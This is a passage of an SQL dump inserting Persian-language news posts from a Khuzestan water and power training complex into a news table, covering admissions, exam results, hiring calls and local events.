	<span style="font-size:16px;"><span style="color:#ffa500;"><u><strong>رشته های کاردانی:</strong></u></span></span><br />
	<br />
	✅ کاردانی فنی ایمنی کار و حفاظت فنی - <span style="color:#b22222;">کد رشته: 10704</span><br />
	✅ کاردانی فنی برق-توزیع - <span style="color:#b22222;">کد رشته: 10144</span><br />
	✅ کاردانی فنی ابزار دقیق - <span style="color:#b22222;">کد رشته: 10195</span><br />
	✅ کاردانی فنی فناوری اطلاعات-اینترنت و شبکه های گسترده - <span style="color:#b22222;">کد رشته: 10497</span><br />
	✅ کاردانی حرفه ای مدیریت کسب و کار - <span style="color:#b22222;">کد رشته: 11857</span><br />
	✅ کاردانی حرفه ای حسابداری بهای تمام شده - <span style="color:#b22222;">کد رشته: 11705</span><br />
	✅ کاردانی حرفه ای گردشگری - <span style="color:#b22222;">کد رشته: 12462</span></p>
<p dir="RTL">
	&nbsp;</p>
<p dir="RTL" style="text-align: justify;">
	<span style="font-size:16px;"><span style="color:#ff0099;"><strong>ثبت نام رشته های کارشناسی ناپیوسته: 5 لغایت 20 شهریور</strong></span></span></p>
<p dir="RTL" style="text-align: center;">
	<strong><span style="font-size:16px;"><a href="https://kwphc.ir/Archive/Other/Karshenasi140205.pdf" target="_blank"><span style="color:#6666ff;">دریافت دفترچه کارشناسی ناپیوسته</span></a></span></strong></p>
<p dir="RTL" style="text-align: center;">
	<a href="https://register1.sanjesh.org/RegJameKarshenasi140203" target="_blank"><span style="color:#6666ff;"><span style="font-size:16px;"><strong>لینک ثبت نام رشته های کارشناسی ناپیوسته</strong></span></span></a></p>
<p dir="RTL">
	<span style="font-size:16px;"><span style="color:#ff0099;"><strong>ثبت نام رشته های کاردانی: 7 لغایت 20 شهریور</strong></span></span></p>
<p dir="RTL" style="text-align: center;">
	<a href="https://kwphc.ir\Archive\Other\Kardani140205.pdf" target="_blank"><span style="color:#6666ff;"><strong><span style="font-size:16px;">دریافت دفترچه کاردانی</span></strong></span></a></p>
<p dir="RTL" style="text-align: center;">
	<a href="https://register2.sanjesh.org/Noetkardani_jame_Registration140203/" target="_blank"><span style="color:#6666ff;"><span style="font-size:16px;"><strong>لینک ثبت نام رشته های کاردانی</strong></span></span></a></p>
<p dir="RTL" style="text-align: justify;">
	<span style="font-size:16px;"><span style="color:#ff0099;"><strong>نحوه ثبت نام :</strong></span></span><br />
	<span style="font-size:16px;"><strong><span style="color:#800080;">به صورت حضوری (بلوار گلستان بین خیابان کاشان و همدان مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان) و یا از طریق سایت سازمان سنجش به نشانی: (www.sanjesh.org)</span></strong></span></p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_121.jpeg" /></p>
', '58206FreeKonkour.jpg', 2536, '1402/6/3', '10:03:11 AM', 1402, 'شهریور', 6, '3');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (58208, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'اعلام نتایج آزمون', '<p dir="RTL" style="margin-right: 1.7pt; text-align: justify;">
	<strong>قابل توجه داوطلبان محترم آزمون جذب نيرو در قالب قرارداد تامين نيروي انساني مورخ 20 مردادماه 1402</strong> <strong>به اطلاع مي رساند</strong><strong><span dir="LTR">:</span></strong></p>
<p dir="RTL" style="margin-right: 1.7pt; text-align: justify;">
	&nbsp;<strong>نتيجه آزمون ياد شده روز چهارشنبه مورخ 5 مهرماه 1402 راس ساعت 8 صبح در وبگاه مجتــمع عالي آموزشي و پژوهشي صنعت آب و برق خوزستان به نشاني: </strong><a href="https://estekhdam.kwphc.ir/azmoon140205" target="_blank">https://estekhdam.kwphc.ir/azmoon140205</a><strong> اعلام می&shy;گردد. </strong></p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="margin-right: 1.7pt; text-align: justify;">
	<span style="color:#003366;"><strong>قابل توجه داوطلبان محترم آزمون جذب نيرو در قالب قرارداد تامين نيروي انساني مورخ 20 مردادماه 1402</strong> <strong>به اطلاع مي رساند</strong><strong><span dir="LTR">:</span></strong></span></p>
<p dir="RTL" style="margin-right: 1.7pt; text-align: justify;">
	<span style="color:#003366;">&nbsp;<strong>نتيجه آزمون ياد شده روز چهارشنبه مورخ 5 مهرماه 1402 راس ساعت 8 صبح در وبگاه مجتــمع عالي آموزشي و پژوهشي صنعت آب و برق خوزستان به نشاني : </strong></span><a href="https://estekhdam.kwphc.ir/azmoon140205" target="_blank"><span style="color:#003366;">https://estekhdam.kwphc.ir/azmoon140205</span></a><span style="color:#003366;"><strong> اعلام می&shy;گردد. </strong></span></p>
<p dir="RTL" style="margin-right: 1.7pt; text-align: justify;">
	<span style="color:#003366;"><strong>ضمن تبريک و آرزوي موفقيت براي پذيرفته شدگان در آزمون کتبي، مقتضي است اصل و تصوير سوابق و مستندات ( طبق مفاد آگهي) جهت بررسي، تشکيل پرونده اوليه و انجام مصاحبه</strong><strong>،</strong><strong> <u>مطابق برنامه زماني به شرح جدول ذيل</u>، به آدرس اهواز </strong><strong>_</strong><strong> بلوار گلستان </strong><strong>_</strong><strong> بين خيابان همدان و کاشان ( روبروي هتل نيشکر) مجتــمع عالي آموزشي و پژوهشي صنعت آب و برق خوزستان مراجعه و ارائه نمايند.</strong></span></p>
<p dir="RTL" style="margin-right: 1.7pt; text-align: justify;">
	<span style="color:#003366;"><strong>بديهي است عدم ارائه &nbsp;سوابق موردنظر در بازه زماني ياد شده توسط پذيرفته شدگان به منزله انصراف تلقي خواهد شد و از نامبردگان در آزمون دانش مهارت ( مصاحبه ) دعوت به عمل نخواهد آمد. </strong></span></p>
<p dir="RTL" style="margin-right: 1.7pt; text-align: center;">
	&nbsp;</p>
<table align="center" border="1" cellpadding="0" cellspacing="0" dir="rtl" style="width: 100%">
	<tbody>
		<tr>
			<td style="width:47px;">
				<p align="center" dir="RTL">
					<span style="color:#003366;">رديف</span></p>
			</td>
			<td style="width:94px;">
				<p align="center" dir="RTL">
					<span style="color:#003366;">نام شهرستان</span></p>
			</td>
			<td style="width:236px;">
				<p align="center" dir="RTL">
					<span style="color:#003366;">تاريخ&nbsp; و زمان ارائه سوابق</span></p>
			</td>
			<td style="width:292px;">
				<p align="center" dir="RTL">
					<span style="color:#003366;">مستندات مورد نياز</span></p>
			</td>
		</tr>
		<tr>
			<td style="width:47px;height:44px;">
				<p align="center" dir="RTL">
					<span style="color:#003366;"><strong>1</strong></span></p>
			</td>
			<td style="width: 94px; height: 44px; text-align: center; vertical-align: middle;">
				<p align="center" dir="RTL">
					<span style="color:#003366;"><strong>انديمشک</strong></span></p>
			</td>
			<td rowspan="2" style="width:236px;height:44px;">
				<p align="center" dir="RTL">
					<span style="color:#003366;"><strong>روز شنبه مورخ 15/07/1402 لغايت&nbsp; </strong></span></p>
				<p align="center" dir="RTL">
					<span style="color:#003366;"><strong>روز دوشنبه مورخ 17/07/1402</strong></span></p>
			</td>
			<td rowspan="4" style="width:292px;height:44px;">
				<p dir="RTL">
					<span style="color:#003366;"><strong>اصل و تصوير برابر با اصل مدارک:</strong></span></p>
				<p dir="RTL">
					<span style="color:#003366;"><strong>1) تحصيلي</strong></span></p>
				<p dir="RTL">
					<span style="color:#003366;"><strong>2) مدارک سجلي( شناسنامه ، کارت ملي ،مدرک نظام وظيفه و </strong><strong><span dir="LTR">....</span></strong><strong> )</strong></span></p>
				<p dir="RTL">
					<span style="color:#003366;"><strong>3) گواهي سابقه کار مرتبط همراه با سوابق پرداخت بيمه</strong></span></p>
				<p dir="RTL">
					<span style="color:#003366;"><strong>4) ساير سوابق مفاد آگهي مانند : سوابق مربوط به فرزندان خانواده هاي شهدا ، بومي بودن و ....</strong></span></p>
			</td>
		</tr>
		<tr>
			<td style="width:47px;height:47px;">
				<p align="center" dir="RTL">
					<span style="color:#003366;"><strong>2</strong></span></p>
			</td>
			<td style="width: 94px; height: 44px; text-align: center; vertical-align: middle;">
				<p align="center" dir="RTL">
					<span style="color:#003366;"><strong>دزفول</strong></span></p>
			</td>
		</tr>
		<tr>
			<td style="width:47px;height:47px;">
				<p align="center" dir="RTL">
					<span style="color:#003366;"><strong>3</strong></span></p>
			</td>
			<td style="width: 94px; height: 44px; text-align: center; vertical-align: middle;">
				<p align="center" dir="RTL">
					<span style="color:#003366;"><strong>ايذه</strong></span></p>
			</td>
			<td rowspan="2" style="width:236px;height:47px;">
				<p align="center" dir="RTL">
					<span style="color:#003366;"><strong>روز سه شنبه مورخ 18/07/1402 لغايت&nbsp; </strong></span></p>
				<p align="center" dir="RTL">
					<span style="color:#003366;"><strong>روز پنجشنبه مورخ 20/07/1402</strong></span></p>
			</td>
		</tr>
		<tr>
			<td style="width:47px;height:46px;">
				<p align="center" dir="RTL">
					<span style="color:#003366;"><strong>4</strong></span></p>
			</td>
			<td style="width: 94px; height: 44px; text-align: center; vertical-align: middle;">
				<p align="center" dir="RTL">
					<span style="color:#003366;"><strong>مسجدسليمان</strong></span></p>
			</td>
		</tr>
	</tbody>
</table>
<div style="clear:both;">
	&nbsp;</div>
<div style="clear:both;">
	<span style="color:#003366;"><strong><span dir="RTL">&nbsp;پذيرفته شدگان در صورت هرگونه سوال مي توانند از طريق شماره تلفن : 33347248-061&nbsp; تماس حاصل نمايند.</span></strong></span></div>
<p>
	&nbsp;</p>
', '58207ENatayej.jpg', 6103, '1402/7/4', '5:53:55 PM', 1402, 'مهر', 7, '4');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (58209, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری رویداد اقتصاد دیجیتال', '<p dir="RTL" style="text-align: justify;">
	پارک علم و فناوری استان با معاونت هماهنگی امور اقتصادی استانداری اقدام به برگزاری رویدادی با عنوان تویعه اقتصاد دیجیتال در محورهای انرژی، بهداشت و درمان، نیازهای شهری و بازار نموده است.</p>
<p>
	&nbsp;</p>', '<p dir="RTL">
	<span style="color:#000066;">پارک علم و فناوری استان با معاونت هماهنگی امور اقتصادی استانداری اقدام به برگزاری رویدادی با عنوان تویعه اقتصاد دیجیتال در محورهای ذیل نموده است.</span></p>
<ul dir="rtl">
	<li>
		<span style="color:#000066;">انرژی</span></li>
	<li>
		<span style="color:#000066;">&nbsp;بهداشت و درمان</span></li>
	<li>
		<span style="color:#000066;">نیازهای شهری</span></li>
	<li>
		<span style="color:#000066;">بازار</span></li>
</ul>
<p dir="RTL">
	<span style="color:#000066;">از دانشجویان، مدرسان، دانش آموختگان، کارشناسان و محققان دعوت به عمل می آید با ثبت ایده های خلاقانه خود در این رویداد بزرگ شرکت نمایند.</span></p>
<p align="center" dir="RTL">
	&nbsp;</p>
<p align="center" dir="RTL">
	<a href="https://www.itapf.ir" target="_blank"><span style="color:#ff3399;"><span style="font-size:16px;">سامانه ثبت ایده</span></span></a></p>
<p align="center" dir="RTL">
	&nbsp;</p>
<p align="center" dir="RTL">
	<img alt="" src="wp-content/uploads/news-images/image_122.jpeg" /></p>
<p>
	&nbsp;</p>', '58209ITAP.jpg', 301, '1402/7/15', '6:34:14 PM', 1402, 'مهر', 7, '15');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (58210, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'اعلام نتیجه دوره كاردانی فنی و دوره كاردانی حرفه‌ای', '<p style="text-align: justify;">
	با عنایت به اعلام نتایج ثبت نام دوره مقطع کاردانی فنی و دوره کاردانی حرفه ای نظام آموزشی مهارتی دانشگاه جامع علمی کاربردی، به اطلاع می رساند داوطلبانی که ثبت نام خود را در سایت سنجش آموزش کشور انجام داده اند می توانند از طریق لینک ذیل از قبولی خود مطلع گردند :</p>
<p style="text-align: center;">
	<a href="https://result2.sanjesh.org/RSJame/JameKardani140207" target="_blank"><span style="font-size:16px;"><span style="color:#4b0082;">مشاهده و چاپ نتیجه</span></span></a></p>
<p style="text-align: justify;">
	&nbsp;</p>
', '<p style="text-align: justify;">
	ضمن تبریک به پذیرفته&zwnj;شدگان، می&zwnj;بایست جهت اطلاع از تاریخ دقیق ثبت&zwnj;نام و انتخاب واحد در روز شنبه ۲۲ مهرماه سال جاری به اطلاعیه مندرج در درگاه اطلاع رسانی دانشگاه به نشانی www.uast.ac.ir مراجعه گردد.<br />
	<br />
	پذیرفته&zwnj;شدگان لازم است در بازه زمانی مندرج در سامانه هم&zwnj;آوا به نشانی edu.uast.ac.ir، اقدام به بارگذاری مدارک اعلام شده زیر در سامانه کنند و سپس جهت تکمیل فرآیند ثبت&zwnj;نام و انتخاب واحد با در دست داشتن اصل مدارک مذکور، به نشانی مرکز آموزشی محل قبولی (اهواز، بلوار گلستان، بین خیابان کاشان و همدان، مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان) مراجعه نمایند.<br />
	<br />
	مدارک لازم برای ثبت&zwnj;نام:<br />
	<br />
	۱- شش قطعه عکس پرسنلی پشت سفید تمام رخ ۴&times;۳ پشت نویسی شده سال جاری.<br />
	۲- دو نسخه تصویر تمام صفحات شناسنامه و اصل آن برای مطابقت.<br />
	۳- دو نسخه تصویر کارت ملی و اصل آن برای مطابقت.<br />
	۴- اصل گواهینامه پایان تحصیلات متوسطه (دیپلم سه ساله نظام جدید ۳-۳-۶ یا نظام ترمی/سالی واحدی شامل نظری، فنی و حرفه&zwnj;ای، &zwnj;کاردانش یا دیپلم نظام قدیم آموزش متوسطه شامل دوره چهارساله یا شش ساله نظری و فنی و حرفه&zwnj;ای) با مهر و امضای رئیس اداره آموزش و پرورش منطقه محل تحصیل.<br />
	۵- اصل کاربرگ ۱۰۱ (گواهی اشتغال به کار) با امضاء و مهر بالاترین&zwnj; مقام&zwnj; مسئول، آخرین فیش حقوقی و آخرین حکم کارگزینی یا قرارداد معتبر انجام کار و برای شاغلین نیروهای مسلح ارایه حکم کارگزینی یا گواهی اشتغال به کار از یگان مربوط برای پذیرفته&zwnj;شدگان در کدرشته محل&zwnj;هایی که مطابق ضوابط مندرج در دفترچه منحصراً پذیرش از شاغلین صورت پذیرفته است.<br />
	۶- اصل کاربرگ شماره ۱۰۲ (فرم تایید معدل) برای پذیرفته&zwnj;شدگانی که گواهینامه پایان تحصیلات متوسطه برای آنان صادر نشده است و حداکثر تا تاریخ ۱۴۰۲/۰۳/۳۱ در مقطع متوسطه دانش&zwnj;آموخته شده&zwnj;اند.<br />
	۷- مدرکی که وضعیت نظام وظیفه برادران را با توجه به بخش مقررات وظیفه عمومی مندرج در دفترچه راهنمای پذیرش دوره&zwnj;های مذکور مشخص نماید و تهیه ۲ نسخه کپی از آن.<br />
	۸- ثبت نام در سامانه خدمات الکترونیک انتظامی (ePolice.ir) برای دانشجویانی که مجاز به استفاده از معافیت تحصیلی می باشند و تحویل تاییدیه ثبت نام در سامانه به صورت حضوری به اداره آموزش.<br />
	۹- درخواست الف) تاییدیه مدرک تحصیلی و ب) سوابق فارغ التحصیلی در سامانه https://emt.medu.ir و تحویل رسیدهای ثبت نام در سامانه به صورت حضوری به اداره آموزش.<br />
	۱۰- بارگذاری تمام مدارک هویتی و سوابق تحصیلی در سامانه https://edu.uast.ac.ir</p>
', '58210PicNews.jpg', 365, '1402/7/20', '2:37:27 PM', 1402, 'مهر', 7, '20');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (59210, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'بهره برداری از مرکز رشد شهدای صنعت آب و برق خوزستان', '<p style="text-align: justify;">
	مرکز رشد شهدای صنعت آب و برق خوزستان&nbsp;صبح سه&zwnj;شنبه ۲۵ مهر سال&nbsp;جاری با حضور&nbsp;محمود معین&zwnj;پور، عضو هیئت رئیسه سپاه خوزستان، جمعی از مسئولان و مدیران سازمان آب و برق خوزستان و مراکز رشد و دانشگاه های استان خوزستان در سالن اجتماعات مجتمع عالی آموزشی و پژوهشی سازمان آب و برق برگزار شد.</p>', '<p style="text-align: justify;">
	مرکز رشد شهدای صنعت آب و برق خوزستان&nbsp;صبح سه&zwnj;شنبه ۲۵ مهر سال&nbsp;جاری با حضور&nbsp;محمود معین&zwnj;پور، عضو هیئت رئیسه سپاه خوزستان، جمعی از مسئولان و مدیران سازمان آب و برق خوزستان و مراکز رشد و دانشگاه های استان خوزستان در سالن اجتماعات مجتمع عالی آموزشی و پژوهشی سازمان آب و برق برگزار شد.</p>
<p style="text-align: justify;">
	معین پور با بیان اینکه این اقدام می&zwnj;تواند به توسعه علم و تحقیق کمک شایانی داشته باشد افزود: سازمان بسیج علم و پژوهش&zwnj;های فناوری با هدف ساماندهی نخبگان ایجاد و با کمک به ایجاد خودباوری تقویت بنیه علمی و بالا بردن انگیزه&zwnj;های علمی به فعالیت&zwnj;هایش ادامه می&zwnj;دهد.</p>
<p style="text-align: justify;">
	وی تصریح کرد: ما مراکز رشد را در سطح&zwnj;های کشوری و استانی برای پرورش ایده و طرح و اجرای آزمایش&zwnj;ها قرار دادیم .</p>
<p style="text-align: justify;">
	معین پور ابراز امیدواری کرد تا با استعانت از خداوند متعال این مرکز توانمند و تخصصی به یک مرکز موفق، شاخص و پیشرو در عرصه ملی تبدیل شود.</p>
<p style="text-align: justify;">
	&nbsp;مهدی هودگر،&nbsp;رئیس مرکز علمی کاربردی سازمان آب و برق، پس از ارائه گزارشی از این مرکز، با بیان اینکه یکی از حلقه&zwnj;هایی که میتواند دانش و پژوهش را تکمیل کند حوزه فناوری و تبدیل علم به محصول است تاکید کرد: این اتفاق در مراکز رشد روی می&zwnj;دهند.</p>
<p style="text-align: justify;">
	وی افزود: ظرفیت سازمان آب و برق خوزستان، شرکت&zwnj;های تحت پوشش آن و همچنین زیرساخت مجتمع عالی آموزشی و پژوهشی صنعت آب و برق، بستر مناسبی است تا بتوانیم پژوهش را به فناوری تبدیل کنیم.</p>
<p style="text-align: justify;">
	وی ادامه داد: برای این کار هم به زیرساخت&zwnj;های فیزیکی و هم به پشتیبانی&zwnj;های مالی نیاز داریم بنابراین تفاهم نامه&zwnj;ای با سازمان علمی و پژوهشی سپاه حضرت ولی عصر عجل الله منعقد شد که در این فرایند بحث پشتیبانی مالی و سرمایه&zwnj;گذاری روی طرح&zwnj;ها از طریق بودجه سازمان علمی و پژوهشی سپاه انجام شود و زیرساخت&zwnj;های فنی و کاربردی مرکز رشد از فضای فیزیکی و امکانات مجتمع عالی آموزشی و پژوهشی سازمان فراهم خواهد شد که این دو بال باعث خواهند شد تا بتوانیم به دانشورانی که در صنعت آب و برق توانایی تولید محصولات دانش محور را دارند خدمات رسانی کرده و ایده&zwnj;ها و محصولات اولیه آنها را تبدیل به محصول قابل ارائه در بازار کنیم.</p>
<p style="text-align: justify;">
	در پایان مدعوین پس از افتتاح مرکز رشد شهدای صنعت آب و برق از قسمت های مختلف آن بازدید و با متولیان آن گفتگو کردند.</p>
<p style="text-align: justify;">
	&nbsp;</p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_123.jpeg" /></p>', '58211NewsMrRoshd.jpg', 769, '1402/7/26', '11:13:02 PM', 1402, 'مهر', 7, '26');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (59211, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'فراخوان جذب مدرس دانشگاه جامع علمی کاربردی', '<p style="text-align: justify;">
	فراخوان جذب مدرس دانشگاه جامع علمی کاربردی برای سال 1402 از روز شنبه 29 مهرماه آغاز می شود.</p>', '<p style="text-align: justify;">
	فراخوان جذب مدرس دانشگاه جامع علمی کاربردی برای سال 1402 از روز شنبه 29 مهرماه آغاز می شود.<br />
	به گزارش روابط عمومی دانشگاه جامع علمی کاربردی ، دکتر اصغر کشت کار قائم مقام رئیس و معاون آموزشی دانشگاه با اعلام این خبر افزود: متقاضیان واجد شرایط می توانند به مدت 2 هفته تا 6 آبان ماه با مراجعه به سامانه جذب مدرسان به آدرس https://jam.uast.ac.ir اقدامات لازم برای مراحل ثبت نام را انجام دهند. دکتر کشت کار درخصوص فرآیند جذب مدرسان دانشگاه جامع علمی کاربردی در سال جاری اظهار داشت: فرآیند بکارگیری مدرسان با نیازسنجی اولیه در مراکز آموزشی انجام شده و ظرفیت نهایی اختصاص یافته پس از تایید واحدهای استانی، جهت تامین نیازها و استفاده بهینه از ظرفیت های موجود باتوجه به دوره های در حال اجرا و هم چنین رشته های جدید در قالب گروه درس های تعیین شده، صورت گرفته است به نحوی که تامین مدرس مورد نیاز مراکز آموزشی، طبق زمان بندی مناسب صورت پذیرد.<br />
	قائم مقام رئیس و معاون آموزشی دانشگاه جامع علمی کاربردی تصریح کرد: حداقل سن متقاضیان برای شرکت در فراخوان ۲۸ سال و حداکثر سن ۶۵ سال می باشد و جذب مدرس بصورت بومی در واحدهای استانی صورت می گیرد. دکتر کشت کار افزود: ملاک ثبت نام قطعی متقاضیان در این فراخوان ، تکمیل فرم های سامانه، پرداخت وجه و اخذ کد رهگیری می&zwnj;باشد.<br />
	قائم مقام رئیس و معاون آموزشی دانشگاه جامع علمی کاربردی در ادامه گفت: ظرفیت پیش بینی شده برای پذیرش مدرسان 3809 نفر می باشد که نیازسنجی آن در یک بازه زمانی مشخص باتوجه به نیازهای زمانی و مکانی مطابق با آمایش آموزش های عالی علمی کاربردی از طریق واحدهای استانی دانشگاه جامع علمی کاربردی انجام و جمع بندی شده است.<br />
	دکتر کشت کار در خاتمه اظهار داشت: دانشگاه تلاش می کند نتایج فراخوان را قبل از شروع ترم آتی تحصیلی ، اعلام نماید تا بتوانیم از خدمات مدرسان جدید در بهبود ارائه آموزش های اشتغال محور بهره مند شویم.</p>', '59211FarakhanModares.jpg', 527, '1402/7/27', '12:06:29 AM', 1402, 'مهر', 7, '27');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (59212, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'چهارمین دوره فراخوان سراسری مدرسان تخصصی صنعت آب و برق', '<p dir="RTL">
	فراخوان متقاضیان تدریس در صنعت آب و برق ویژه :</p>
<ul>
	<li dir="RTL">
		متخصصان و کارشناسان خبره شاغل در شرکت های صنعت آب و برق</li>
	<li dir="RTL">
		اعضای هیئت علمی دانشگاه ها و مدرسان مؤسسات آموزشی و پژوهشی</li>
	<li dir="RTL">
		دانشآموختگان کارشناسی ارشد و دکترا در رشته های فنی تخصصی مرتبط با وزارت نیرو (آب، آب و فاضلاب محیط زیست، برق و انرژی و مکانیک)</li>
</ul>
<p>
	&nbsp;</p>
', '<p dir="RTL">
	<span style="color:#6666ff;">به منظور تكميل شبكه مدرسان تخصصي صنعت آب و برق،&zwnj; اعضاي هيأت علمي دانشگاه&shy;ها و مؤسسات آموزش عالي، متخصصان و كارشناسان خبره شاغل در صنعت آب و برق، دانش آموختگان كارشناسي ارشد و دكتراي مرتبط با وزارت نیرو (آب، آب و فاضلاب محیط زیست، برق و انرژی و مکانیک)، &zwnj;مي توانند جهت ثبت اطلاعات و بارگذاري مدارك خود از تاريخ 1 لغايت 30 آبان ماه 1402 با مراجعه به سامانه جامع راهبري آموزش و صلاحيت حرفه اي به نشاني </span><a href="https://tvqc-trainers.moe.gov.ir/login" target="_blank"><span style="color:#ff0099;">https://tvqc-trainers.moe.gov.ir/login</span></a><span style="color:#6666ff;"> اقدام نمايند.</span></p>
<p dir="RTL">
	<span style="color:#6666ff;">بديهي است پس از بررسي و ارزيابي مدارك بارگذاري شده از سوي متقاضيان،&nbsp; در صورت كسب امتيازات لازم ، اسامي نفرات تأييد شده به همراه حيطه و گرايش مربوطه در سامانه جامع راهبري آموزش و صلاحيت حرفه &shy;اي درج و در دسترس شركت&shy;ها و مراكز آموزشي مجاز قرار خواهد گرفت.</span></p>
<p dir="RTL">
	<span style="color:#6666ff;">جهت كسب اطلاعات بيشتر، سركار خانم دهقاني با شماره تماس </span><span style="color:#ff3399;">09014377705</span><span style="color:#6666ff;"> معرفي مي&shy; شود.</span></p>
<p dir="RTL" style="text-align: center;">
	<a href="https://kwphc.ir/Archive/Other/RahnamVorod.pdf" target="_blank"><span style="color:#ff3399;"><span style="font-size:16px;">دریافت فایل راهنمای ورود اطلاعات مدرسین</span></span></a></p>
<p dir="RTL">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_124.jpeg" style="height: 864px; width: 600px;" /></p>
<p>
	&nbsp;</p>
', '59212FarakhanPic.jpg', 2943, '1402/8/6', '11:08:57 AM', 1402, 'آبان', 8, '6');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (59213, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'فراخوان اولین جشنواره رویش', '<p dir="RTL" style="text-align: justify;">
	به استحضار میرساند، جشنواره &quot;رویش&quot;، یادبود دانشمند جهادگر دکتر کاظمی آشتیانی و فراخوان آثار پژوهشگران شاهد و ایثارگر و پژوهشگران عرصه ایثار و شهادت درآذرماه سال جاري توسط بنیاد شهید برگزار می گردد.</p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	ترویج فرهنگ ایثار و شهادت همچون هر پدیده فرهنگي دیگري از ظرافتها و حساسیت هاي خاص خود برخوردار است و هرنوع موفقیت در این زمینه مستلزم بهره گیري از روشهاي صحیح فرهنگ سازي است. براي حفظ و انتقال ارزش هاي دفاع مقدس و فرهنگ ایثار و شهادت به نسل آینده، مي بایست این فرهنگ با جدیت تمام در سیاست ها و برنامه ریزي هاي فرهنگي، اجتماعي كشور لحاظ و ثبت گردد. به همین منظور اولین جشنواره &quot;رویش&quot;، یادبود دانشمند جهادگر دکتر کاظمی آشتیانی و فراخوان آثار پژوهشگران شاهد و ایثارگر و پژوهشگران عرصه ایثار و شهادت درآذرماه سال جاري توسط بنیاد شهید برگزار می گردد.</p>
<p dir="RTL" style="text-align: justify;">
	علاقه مندان می توانند آثار خود را در قالب کتاب، مقاله و پایان نامه تا تاریخ 15 آبان ماه به دبیرخانه باشگاه پژوهشگران شاهد و ایثارگر واقع در پژوهشکده مهندسی و علوم پزشکی جانبازان، دفتر مطالعات و پژوهش ها و یا به آدرس الکترونیک <a href="mailto:Researchdmp@mail.ir"><span dir="LTR">Researchdmp@mail.ir</span></a> ارسال نمایند.</p>
<p dir="RTL" style="text-align: center;">
	<span style="color:#6666ff;"><span style="font-size:16px;"><span style="font-size:14px;">تلفن دبیرخانه: 09101462848</span></span></span></p>
<p dir="RTL" style="text-align: center;">
	<a href="https://kwphc.ir/archive/other/DastoorAmal.pdf" target="_blank"><span style="font-size:16px;"><span style="color:#ff0099;">دریافت دستورالعمل برگزاری جشنواره </span></span></a></p>
<p dir="RTL" style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_125.jpeg" /></p>
<p>
	&nbsp;</p>
', '59213NewsShahed.jpg', 495, '1402/8/13', '8:54:23 AM', 1402, 'آبان', 8, '13');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (59214, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری آزمون استخدامی', '<p>
	شرکت آبادگران صنعت بختیاری به منظور تأمين نيروي انساني مورد نياز خود از بین افراد واجد شرایط دعوت به همکاری می نماید.</p>
', '<div style="text-align:justify">
	<p>
		به اطلاع ميرساند شرکت آبادگران صنعت بختیاری به منظور تأمين نيروي انساني مورد نياز، <strong>از آقايان </strong>واجد شرايط را از طريق آزمون توانمندي&shy;هاي عمومی و تخصصي(كتبي) و آزمون دانش مهارت (&shy;مصاحبه) و طی فرآیند گزینش و به ترتیب از بالاترین نمره با شرايط ذيل و در قالب قرارداد نیروی حجمی جذب مي&shy; نمايد.</p>
	<p dir="RTL" style="text-align: justify;">
		در صورت بروز هرگونه مشكل و ابهام با شماره تلفن 33347248-061 مجتمع عالي آموزشي و پژوهشي صنعت آب و برق خوزستان به عنوان مجري آزمون در وقت اداري تماس حاصل نمایید.</p>
	<p dir="RTL" style="text-align: center;">
		<a href="http://estekhdam.kwphc.ir/azmoon1402" target="_blank"><span style="font-size:16px;"><span style="color:#800080;"><strong>ورود به سامانه ثبت نام</strong></span></span></a></p>
	<p dir="RTL" style="text-align: center;">
		<a href="https://kwphc.ir/archive/other/zamime.zip" target="_blank"><strong><span style="font-size:16px;"><span style="color:#ff0099;">دریافت فایلهای ضمیمه</span></span></strong></a></p>
	<p dir="RTL" style="text-align: center;">
		<img alt="" src="wp-content/uploads/news-images/image_126.jpeg" /></p>
</div>
<p>
	&nbsp;</p>
', '59214Azmoon.jpg', 9058, '1402/8/16', '3:39:24 PM', 1402, 'آبان', 8, '16');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (59215, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری جلسه ارزیابی صلاحیت حرفه ای با شرکت های زیر مجموعه شرکت مادر تخصصی توانیر', '<p>
